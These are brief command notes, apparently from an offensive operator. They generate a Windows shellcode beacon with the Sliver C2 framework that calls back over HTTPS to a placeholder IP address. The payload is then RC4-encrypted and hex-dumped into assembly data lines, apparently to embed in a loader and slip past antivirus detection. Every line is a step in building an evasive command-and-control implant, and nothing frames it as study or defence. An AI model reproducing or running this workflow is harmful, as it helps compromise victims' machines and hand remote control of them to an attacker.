generate beacon --seconds 5 --jitter 3 --os windows -a amd64 --format shellcode -b https://172.x.x.x:443 --name httpsBeacon --save /tmp/https50.bin -G --skip-symbols
python rc4.py <key> <filename>  ---> creates https50.bin.enc
<hexdump -v -e '1/2 "dw 0%.4xh\n"' https50.bin.enc| tee out.txt>
